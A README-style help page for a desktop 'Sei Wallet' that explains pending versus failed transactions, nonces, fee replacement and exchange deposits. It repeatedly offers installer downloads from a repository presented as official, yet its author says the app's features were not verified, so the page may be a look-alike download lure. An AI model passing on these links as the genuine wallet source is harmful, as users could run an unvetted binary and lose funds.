![Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/raw/main/assets/banner-article.png)

<h1 align="center">A pending or failed transaction in Sei Wallet</h1>

<p align="center">Tell a queued transfer from a failed one, then act on the right one.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

| Platform | Requirements | File |
|:--|:--|:--|
| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Two different problems get called "stuck", and telling them apart is the whole diagnosis. A **pending** transaction was broadcast and has not been included yet — it may still succeed, and it may still be replaceable. A **failed** transaction was included and reverted: it is finished, the amount did not move, and the fee is gone.

One is a waiting problem. The other is a settled outcome. Acting on the wrong one wastes the window in which you could still change something.

## Tell them apart in one step

Open the activity view in [the app's activity view](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md) and copy the transaction hash, then look it up on a block explorer.

| What the explorer shows | What it means |
|---|---|
| Not found at all | Broadcast may not have reached the network, or it is still in the mempool |
| Found, `pending` / no block | Queued and waiting — the replaceable case |
| Found, confirmed, success | Done; if the balance looks wrong, this is an address or display question |
| Found, confirmed, **reverted** | Failed; the fee is spent and nothing moved |

If you cannot find the hash anywhere, the transaction was probably never broadcast — a device approval that timed out, a wallet that closed mid-flow, or an endpoint that rejected it. Nothing has happened yet, and retrying is safe.

## Why a transaction stays pending

Four causes, in rough order of frequency.

**The fee was below what the network is accepting.** Sei's fee market moves; a fee that worked last month can sit in the queue today. The mechanics of setting it are in [the fee settings](https://github.com/sei-chain/sei-wallet-staking/blob/main/gas-fees-and-fee-settings.md).

**An earlier transaction from the same account is stuck.** Every account has a nonce — a counter — and transactions must be included in order. One low-fee transaction blocked at nonce 12 blocks everything you send afterwards at nonce 13, however generous its fee. This is the cause people miss, because the stuck transaction they are looking at is not the one at fault.

**The endpoint you are using is behind.** A wallet talks to an RPC node, and a lagging node reports a transaction as missing or pending after the chain has moved on. Re-checking against a public explorer separates a stale view from a real queue.

**The chain is busy.** Less common, and it resolves on its own; the other three do not.

## What you can do about a pending transaction

**Wait, briefly.** Most pending transactions confirm within a minute or two when the fee is adequate. Waiting is correct if the hash is visible and the fee was reasonable.

**Replace it with the same nonce.** In an EVM account you can submit a second transaction with the same nonce and a higher fee; the network keeps whichever it sees first, and a higher fee wins the race. Whether this wallet exposes a "speed up" or "replace" control is a product detail I did not verify, so check the app rather than assuming. If it does, the replacement must go to the same recipient with the same amount, or you have simply created a second payment.

**Clear the blockage at its source.** If the stuck transaction is an earlier nonce, replacing the *earlier* one is what frees the queue. Raising the fee on the newest transaction does nothing while an older nonce is stuck.

**Do not resend to a different address to "force it through".** That creates a second payment that can also confirm, and now you have sent twice.

One caution about replacement: it depends on the original still being pending. Once it confirms, there is nothing to replace, and the second transaction becomes an additional transfer. Check the explorer before acting, not after.

## Why a transaction fails

A failed transaction is a result, not a malfunction. The common reasons:

- **Out of gas.** The fee limit was too low for the work the transaction needed. The fee spent is the gas actually consumed up to the failure.
- **A revert.** The contract or the chain rejected the operation — insufficient balance for the amount plus fee, a staking rule, an expired deadline, a slippage limit on a swap.
- **Wrong network.** A transaction built for one chain sent to another fails or never confirms.
- **A nonce gap.** The transaction cannot execute because an earlier nonce is missing.

In every case the amount stays in your account and the fee does not come back. The explorer's status field and the error string are the useful evidence, and [failed transactions in detail](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-failed-what-to-check.md) covers reading them.

## The three cases that are not really wallet problems

**An exchange deposit that has not credited.** The exchange waits for a number of confirmations before crediting, and its own review can add time on top. If the chain shows confirmed and the exchange shows nothing, the exchange is the party to ask. If the deposit was missing a required memo, the funds reached the exchange but are unattributed, which is a ticket rather than a loss — [the memo rule](https://github.com/sei-chain/sei-wallet-setup/blob/main/memo-and-tag-for-exchange-deposits.md) explains when the field is required.

**A token transfer that shows nothing.** Tokens are contract balances, and a transfer of a token is a contract call, not a native SEI payment. It can fail for reasons a native transfer cannot, including a contract that is paused or a balance that is held elsewhere. [Tokens and their contracts](https://github.com/sei-chain/sei-wallet-staking/blob/main/usdc-and-other-tokens.md) covers that distinction.

**A transfer from another wallet that "never arrived".** Check the address form before anything else: a transfer sent to a `sei1…` address while you watch the `0x…` side of the same account is not missing, it is in the other view. If you moved from Compass, [the Compass handover](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-off-compass.md) describes which address that wallet showed you and why it may differ.

## What not to do while something is pending

- **Do not paste your seed phrase into a "transaction lookup" site.** There is no such service. A hash is enough to look anything up, and a site asking for more is collecting keys.
- **Do not accept help from a direct message.** The people who offer to "push your transaction through" are the same people who ask you to validate a wallet.
- **Do not reinstall the wallet** to fix a pending transaction. It changes nothing on-chain, and it risks the one thing you cannot replace.
- **Do not send a second payment to a new address** because the first is slow. Two confirmed payments is a worse outcome than a delayed one.

## Preventing the next stuck transaction

- **Keep a liquid balance** above the fee, especially when staking; a fully bonded account cannot pay for its own exit.
- **Check the fee before confirming**, and expect the number to drift over time.
- **Watch the nonce when a transaction hangs** — the fix is usually one transaction earlier than the one you are looking at.
- **Confirm on the device** if you use a hardware wallet, and keep the device awake until the prompt completes; a timed-out approval leaves nothing broadcast, which is a safe failure.

## Frequently asked questions

**How long should a Sei transaction take?** Usually seconds once it is included. A transaction that is still pending after a couple of minutes is waiting on its fee or on an earlier nonce, not on a long block time.

**Can I cancel a pending transaction?** Not directly. You can replace it with the same nonce and a higher fee, which effectively overwrites it — if the app offers that. Otherwise you wait.

**Is my money gone if the transaction failed?** No. The amount stays in your account; the network fee is spent, because the work was done even though the result was a revert.

**Why did a later transaction fail while an earlier one is pending?** The nonce order. Nothing after a stuck nonce can execute until that gap is filled.

**The explorer says confirmed but my balance did not change. What now?** Check the recipient and the account you are viewing. A confirmed transfer that left your account went somewhere; if the destination is your own other account or the other address form, it is there.

**Do I need to resend after a failure?** Only after fixing the cause. Retrying the identical transaction usually fails identically.

**Can support cancel it for me?** No. The wallet cannot sign for your account or reverse a broadcast, which is the same reason it cannot recover a wrong-address transfer.

## Download Sei Wallet

| Platform | Installer |
|:--|:--|
| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
- [Sei gas fees and what Sei Wallet shows before you sign](https://github.com/sei-chain/sei-wallet-staking/blob/main/gas-fees-and-fee-settings.md)
- [A failed Sei Wallet transaction: what each error means](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-failed-what-to-check.md)
- [The Sei memo field and exchange deposits into Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/memo-and-tag-for-exchange-deposits.md)
